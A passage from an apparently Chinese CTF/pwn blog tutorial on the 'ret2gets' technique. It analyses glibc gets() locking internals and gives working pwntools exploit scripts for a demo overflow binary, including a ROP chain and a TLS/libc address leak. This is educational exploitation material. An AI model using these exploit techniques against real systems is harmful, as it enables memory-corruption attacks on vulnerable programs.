class="literal">NULL</span>;</span><br><span class="line">      <span class="keyword">goto</span> unlock_return;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This is very tricky since a file descriptor may be in the</span></span><br><span class="line"><span class="comment"> non-blocking mode. The error flag doesn&#x27;t mean much in this</span></span><br><span class="line"><span class="comment"> case. We return an error only when there is a new error. */</span></span><br><span class="line">      <span class="type">int</span> old_error = <span class="built_in">stdin</span>-&gt;_flags &amp; _IO_ERR_SEEN;</span><br><span class="line">      <span class="built_in">stdin</span>-&gt;_flags &amp;= ~_IO_ERR_SEEN;</span><br><span class="line">      buf[<span class="number">0</span>] = (<span class="type">char</span>) ch;</span><br><span class="line">      count = _IO_getline (<span class="built_in">stdin</span>, buf + <span class="number">1</span>, INT_MAX, <span class="string">&#x27;\n&#x27;</span>, <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">stdin</span>-&gt;_flags &amp; _IO_ERR_SEEN)</span><br><span class="line">&#123;</span><br><span class="line">  retval = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">goto</span> unlock_return;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line"><span class="built_in">stdin</span>-&gt;_flags |= old_error;</span><br><span class="line">    &#125;</span><br><span class="line">  buf[count] = <span class="number">0</span>;</span><br><span class="line">  retval = buf;</span><br><span class="line">unlock_return:</span><br><span class="line">  _IO_release_lock (<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在函数的开头，它使用 <code>_IO_acquire_lock</code>，在函数结束时，它使用 <code>_IO_release_lock</code>。这个想法是， 获取锁会告诉其他线程 <code>stdin</code> 当前正在使用中，并且尝试访问 <code>stdin</code> 的任何其他线程将被迫等待，直到该线程释放锁，告诉其他线程 <code>stdin</code> 不再使用。</p><p><code>_IO_acquire_lock</code>&#x2F;<code>_IO_release_lock</code><br>这些<a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L88">stdio-lock.h - sysdeps&#x2F;nptl&#x2F;stdio-lock.h - Glibc source code glibc-2.35 - Bootlin Elixir Cross Referencer</a>如下:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#  define _IO_acquire_lock(_fp) \</span><br><span class="line">  <span class="keyword">do</span> &#123;      \</span><br><span class="line">    FILE *_IO_acquire_lock_file      \</span><br><span class="line">__attribute__((<span class="title function_ invoke__">cleanup</span> (_IO_acquire_lock_fct)))      \</span><br><span class="line">= (_fp);      \</span><br><span class="line">    _IO_flockfile (_IO_acquire_lock_file);</span><br><span class="line"># <span class="keyword">else</span></span><br><span class="line">#  ...</span><br><span class="line"># endif</span><br><span class="line"># define _IO_release_lock(_fp) ; &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>从中可以得出 <code>_IO_flockfile</code> 和 <code>_IO_acquire_lock_fct</code> 两个重要功能。<br><code>__attribute__（（cleanup））</code> 可能看起来很奇怪，但它所做的只是在人工 <code>do-while(0)</code> 块结束时（基本上在 IO 函数结束时）在 <code>_fp</code> 上调用 <code>_IO_acquire_lock_fct</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line">__attribute__ ((__always_inline__))</span><br><span class="line">_IO_acquire_lock_fct (FILE **p)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *fp = *p;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_USER_LOCK) == <span class="number">0</span>)</span><br><span class="line">    _IO_funlockfile (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用于锁定和解锁的 2 个宏是 <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L282">_IO_flockfile</a> 和 <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L284">_IO_funlockfile</a>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_flockfile(_fp) \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (((_fp)-&gt;_flags &amp; _IO_USER_LOCK) == 0) _IO_lock_lock (*(_fp)-&gt;_lock)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_funlockfile(_fp) \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (((_fp)-&gt;_flags &amp; _IO_USER_LOCK) == 0) _IO_lock_unlock (*(_fp)-&gt;_lock)</span></span><br></pre></td></tr></table></figure><p><code>_IO_USER_LOCK=0x8000</code> 是一个宏，它似乎表明是否应该使用内置锁定。这通常在内部使用，例如在 <code>printf</code> 中的帮助程序流中，这通常在内部使用，例如在 <code>printf</code> 中的帮助程序流中。但是不重要我们学习ret2gets需要了解这些，因为此检查将始终通过 <code>stdin</code> （或任何与此相关的标准流）。最后，我们来看看我们关心的宏：<code>_IO_lock_lock</code> 和 <code>_IO_lock_unlock</code>。</p><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L37">_IO_lock_lock</a> 和 <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L67">_IO_lock_unlock</a> 定义为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_lock_lock(_name) \</span></span><br><span class="line"><span class="meta">  do &#123;      \</span></span><br><span class="line"><span class="meta">    void *__self = THREAD_SELF;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> ((_name).owner != __self)      \</span></span><br><span class="line"><span class="meta">      &#123;      \</span></span><br><span class="line"><span class="meta">lll_lock ((_name).lock, LLL_PRIVATE);      \</span></span><br><span class="line"><span class="meta">        (_name).owner = __self;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">    ++(_name).cnt;      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_lock_unlock(_name) \</span></span><br><span class="line"><span class="meta">  do &#123;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (--(_name).cnt == 0)      \</span></span><br><span class="line"><span class="meta">      &#123;      \</span></span><br><span class="line"><span class="meta">        (_name).owner = NULL;      \</span></span><br><span class="line"><span class="meta">lll_unlock ((_name).lock, LLL_PRIVATE);      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>请注意，<code>_name</code> 就是锁本身(也就是我们刚刚说的 <code>_IO_lock_t *_lock</code>)，在 <code>gets</code> 的情况下，也就是 <code>_IO_stdfile_0_lock</code>。<br>如果 <code>owner</code> 与 <code>THREAD_SELF</code> 不同（即 lock 由不同的线程拥有），它会等待该线程使用 <code>lll_lock</code> <em>解锁</em> ，然后声明锁的所有权。解锁时，它会删除其所有权，并发出信号表明它不再与 <code>lll_unlock</code> 一起使用。</p><p>观察源码可知 <code>_IO_lock_unlock</code> 是大多数 <code>IO函数</code>（包括 <code>gets</code>）的末尾调用的内容，<br>所以它是返回之前最后一个对寄存器有影响的函数，所以探究 <code>rdi寄存器</code> 为什么保存 <code>_IO_stdfile_0_lock</code> 就需要从这个函数入手<br>直接观察gets函数结尾，我们发现gets函数最后退出的时候是不会改变rdi寄存器的<br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/3.png"></p><p>这里是gets调用 <code>_IO_lock_unlock</code> 的部分汇编代码<br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/4.png"><br>这部分代码中 <code>rbp</code> 存储了 <code>stdin</code> 的地址，因此 <code>0x080656</code> 这里的 <code>test</code> 是检查 <code>_IO_USER_LOCK_</code><br><code>0x08065F</code> 地址处是 <code>rbp+0x88</code> 我们知道 <code>_Lock</code> 就存储在 <code>FILE</code> 结构体(stdin就属于FILE结构体)的0x88偏移处</p><p>这里展示一下 <code>FILE结构体</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;       <span class="comment">//用来表示当前用于存储与文件流相关的标志，比如：当前文件流是有缓冲还是无缓冲，文件流是否支持读取，文件流是否遇到了错误等等具体在下面有所列举</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;   <span class="comment">//指向当前读取位置的指针</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;   <span class="comment">//指向读取缓冲区结束位置的指针</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;  <span class="comment">//指向读取缓冲区开始位置的指针，通常三个一起使用来进行数据的读取操作，其中base和end分别标记了起始和终点的位置，ptr则进行数据的遍历。</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base; <span class="comment">//指向当前写入位置的指针。</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;  <span class="comment">//指向写入缓冲区结束位置的指针。</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;  <span class="comment">//指向写入缓冲区结束位置的指针。同上三个一起完成数据的写入操作。</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;   <span class="comment">//指向整个缓冲区（包括读取和写入缓冲区）开始位置的指针。</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;    <span class="comment">//指向整个缓冲区结束位置的指针。</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">//指向旧读取区域的开始位置的指针，用于标记/回退功能。</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">//指向备份区域的第一个有效字符的指针。</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">//指向非当前读取区域的结束位置的指针。</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span>    <span class="comment">//指向文件流的标记链表的头指针，用于流中的标记和定位。</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span>        <span class="comment">//指向下一个 _IO_FILE 结构体的指针，用于维护一个文件流链表。</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;              <span class="comment">//存储与此文件流相关联的文件描述符。</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;          </span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;               <span class="comment">//存储与此文件流相关联的文件描述符。</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset;   <span class="comment">//存储旧的文件偏移量，用于定位操作</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span>     </span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;       <span class="comment">//存储旧的文件偏移量，用于定位操作</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;       <span class="comment">//存储虚拟函数表（vtable）的偏移量。</span></span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];                <span class="comment">//一个小型的字符数组，用于在没有分配完整缓冲区时的简单操作。</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;                 <span class="comment">//指向互斥锁的指针，用于线程安全。</span></span><br><span class="line">  # 最后gets执行结束之后rdi就是指向这里</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以这里 <code>rdi</code> 变成了 <code>stdin._lock</code> 也就是变成了 <code>_IO_stdfile_0_lock</code><br>具体信息可通过下图gdb调试来得到，现在我们知道了 <code>_IO_stdfile_0_lock</code> 的来源<br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/5.png"></p><p>注意在<code>_IO_lock_unlock</code>函数结束后下面还有一个 <code>__lll_lock_wait_private</code> 函数，但是没有关系，因为这个函数并不会破坏 <code>rdi</code><br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/6.png"></p><h4 id="为什么-IO-stdfile-0-lock要放入到rdi寄存器里面"><a href="#为什么-IO-stdfile-0-lock要放入到rdi寄存器里面" class="headerlink" title="为什么_IO_stdfile_0_lock要放入到rdi寄存器里面"></a><strong>为什么_IO_stdfile_0_lock要放入到rdi寄存器里面</strong></h4><p>上面我们分析的<code>_IO_stdfile_0_lock</code> 的来源，但是为什么要把 <code>_lock</code> 会被加载到 <code>RDI</code> 中?</p><p>猜测这是编译器优化的结果，在调用 <code>lll_unlock</code> 的情况下，<code>_lock</code> 的地址作为唯一的参数直接传递给 <code>futex</code> 包装器（即通过 <code>rdi</code> 寄存器）。因此，它将 <code>_lock</code> 加载到 <code>rdi</code> 中，这样它就不需要使用额外的 <code>assignment</code> 来准备对 <code>futex</code> 的调用，例如 <code>mov rdi, [register containing _lock]</code> ，从而节省了空间和时间。</p><p>下面来看一下2.30之前的glibc中的 <code>_IO_lock_unlock</code><br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/7.png"></p><p>上图是glibc-2.29的 <code>_IO_lock_unlock</code> 函数<br>我们可以看到它不是将其加载到 <code>rdi</code> 中，而是使用 <code>mov rdx,[rbp+0x88]</code> 将其加载到 <code>rdx</code> 中，然后使用 <code>lea rdi,[rdx]</code> 加载到 <code>rdi</code> 中，这也说明 <code>_lock</code> 只有在非常特定的条件下才会被加载到 <code>rdi</code> 中，所以ret2gets并非在所有版本的glibc中都使用，它可能仅在部分高版本中适用</p><h4 id="ret2gets的具体利用方法"><a href="#ret2gets的具体利用方法" class="headerlink" title="ret2gets的具体利用方法"></a><strong>ret2gets的具体利用方法</strong></h4><p>上面就是gets函数源码的大致流程，那么通过分析我们就知道我们需要绕过的检测其实就是 <code>_IO_lock_lock</code> 和 <code>_IO_lock_unlock</code> 两个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_lock_lock(_name) \</span></span><br><span class="line"><span class="meta">  do &#123;      \</span></span><br><span class="line"><span class="meta">    void *__self = THREAD_SELF;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> ((_name).owner != __self)      \</span></span><br><span class="line"><span class="meta">      &#123;      \</span></span><br><span class="line"><span class="meta">lll_lock ((_name).lock, LLL_PRIVATE);      \</span></span><br><span class="line"><span class="meta">        (_name).owner = __self;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">    ++(_name).cnt;      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_lock_unlock(_name) \</span></span><br><span class="line"><span class="meta">  do &#123;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (--(_name).cnt == 0)      \</span></span><br><span class="line"><span class="meta">      &#123;      \</span></span><br><span class="line"><span class="meta">        (_name).owner = NULL;      \</span></span><br><span class="line"><span class="meta">lll_unlock ((_name).lock, LLL_PRIVATE);      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><ol><li>由于 <code>_IO_lock_unlock</code> 有一个 <code>--(_name).cnt == 0</code> 一旦这个判断成功那么我们的 <code>owner</code> 就会变成 <code>NULL</code> 我们就无法再后续的 <code>puts</code> 中拿到 <code>TLS地址</code>，也就是说我们需要覆盖 <code>_IO_lock_t</code> 结构体的 <code>cnt</code> 不能为 <code>1</code></li><li>我们需要注意 <code>_IO_lock_t</code> 结构体 在 <code>owner参数</code> 之前不能有 <code>\x00</code> 否则 <code>puts</code> 输出的时候会被截断</li><li>我们输入的数据第五个字节会被 <code>减去1</code> (也就是cnt会被减去1)</li></ol><p>对于第三条我们依旧使用之前的这个例子来证明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;ROP me if you can!&quot;</span>);</span><br><span class="line">gets(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = context.binary = ELF(<span class="string">&#x27;demo&#x27;</span>)</span><br><span class="line">p = e.process()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于最后一个调用的函数是gets，所以最后main函数返回的时候 rdi 就是指向我们的 _IO_lock_t 结构体地址</span></span><br><span class="line"><span class="comment"># 所以我们只需要溢出之后调用一次gets就可以往 _IO_lock_t 里面写入东西了</span></span><br><span class="line">payload  = <span class="string">b&quot;A&quot;</span> * <span class="number">0x20</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment"># saved rbp</span></span><br><span class="line">payload += p64(e.plt.gets)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;ROP me if you can!\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(<span class="string">b&quot;/bin&quot;</span> + p8(u8(<span class="string">b&quot;/&quot;</span>)+<span class="number">1</span>) + <span class="string">b&quot;sh&quot;</span>)</span><br><span class="line"><span class="comment"># 这里第五个字节会被-1所以传入的时候需要+1</span></span><br><span class="line"><span class="comment"># 我们传入 /bin0sh 字符串</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>下面进入调试看看我们打入的 <code>bin0sh字符串</code> 会如何变化 (下面这是两张截图拼一起了，看起来有点怪，将就一下)<br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/8.png"></p><p>总之我们可以知道，我们的第五个字符会被减去1</p><p>所以如果我们希望利用 <code>puts函数</code> 来泄露出 <code>owner</code> 中存储的 <code>TLS地址</code> 那么我们可以使用下面这个payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span> * <span class="number">4</span> + <span class="string">b&quot;\x00&quot;</span>*<span class="number">3</span>)</span><br><span class="line"><span class="comment"># 这里填充 \x00\x00\x00 开头本来就是\x00</span></span><br></pre></td></tr></table></figure><p>而这个payload会让我们的 <code>_IO_lock_t</code>结构体中的  <code>lock</code> 赋值为 <code>AAAA</code> 而将 <code>cnt</code> 变为 <code>\x00\x00\x00\x00</code><br>这个时候 <code>cnt-1</code> 反而会让 <code>\x00\x00\x00\x00</code> 通过整数溢出变成 <code>\xff\xff\xff\xff</code><br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/9.png"></p><p>这样我们就可以顺利绕过 <code>\x00</code> 导致的 <code>puts函数</code> 输出的截断了<br>所以上述例子泄露TLS地址的exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># glibc-2.30 to glibc-2.36</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = context.binary = ELF(<span class="string">&#x27;demo&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc&quot;</span>)</span><br><span class="line">p = e.process()</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;A&quot;</span> * <span class="number">0x20</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment"># saved rbp</span></span><br><span class="line">payload += p64(e.plt.gets)</span><br><span class="line">payload += p64(e.plt.puts)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;ROP me if you can!\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span> * <span class="number">4</span> + <span class="string">b&quot;\x00&quot;</span>*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">tls = u64(p.recv(<span class="number">6</span>) + <span class="string">b&quot;\x00\x00&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&quot;tls: <span class="subst">&#123;<span class="built_in">hex</span>(tls)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc.address = tls + <span class="number">0x28c0</span></span><br><span class="line">log.info(<span class="string">f&quot;libc: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>上述exp在 2.35 上进行了测试，应该适用于 2.30-2.36，但 2.37 将 <a href="https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/nptl/stdio-lock.h#L37">_IO_lock_lock</a> 和 <a href="https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/nptl/stdio-lock.h#L70">_IO_lock_unlock</a> 更改为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_lock_lock(_name) \</span></span><br><span class="line"><span class="meta">  do &#123;      \</span></span><br><span class="line"><span class="meta">    void *__self = THREAD_SELF;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (SINGLE_THREAD_P &amp;&amp; (_name).owner == NULL)      \</span></span><br><span class="line"><span class="meta">      &#123;      \</span></span><br><span class="line"><span class="meta">(_name).lock = LLL_LOCK_INITIALIZER_LOCKED;      \</span></span><br><span class="line"><span class="meta">(_name).owner = __self;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> <span class="keyword">if</span> ((_name).owner != __self)      \</span></span><br><span class="line"><span class="meta">      &#123;      \</span></span><br><span class="line"><span class="meta">lll_lock ((_name).lock, LLL_PRIVATE);      \</span></span><br><span class="line"><span class="meta">(_name).owner = __self;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span>      \</span></span><br><span class="line"><span class="meta">      ++(_name).cnt;      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_lock_unlock(_name) \</span></span><br><span class="line"><span class="meta">  do &#123;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (SINGLE_THREAD_P &amp;&amp; (_name).cnt == 0)      \</span></span><br><span class="line"><span class="meta">      &#123;      \</span></span><br><span class="line"><span class="meta">(_name).owner = NULL;      \</span></span><br><span class="line"><span class="meta">(_name).lock = 0;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> <span class="keyword">if</span> ((_name).cnt == 0)      \</span></span><br><span class="line"><span class="meta">      &#123;      \</span></span><br><span class="line"><span class="meta">(_name).owner = NULL;      \</span></span><br><span class="line"><span class="meta">lll_unlock ((_name).lock, LLL_PRIVATE);      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span>      \</span></span><br><span class="line"><span class="meta">      --(_name).cnt;      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>仅当 <code>cnt ！= 0</code> 时，<code>cnt</code> 才会递减<br>这就导致我们没有办法再利用 <code>整数溢出</code> 来绕过 <code>\x00</code> 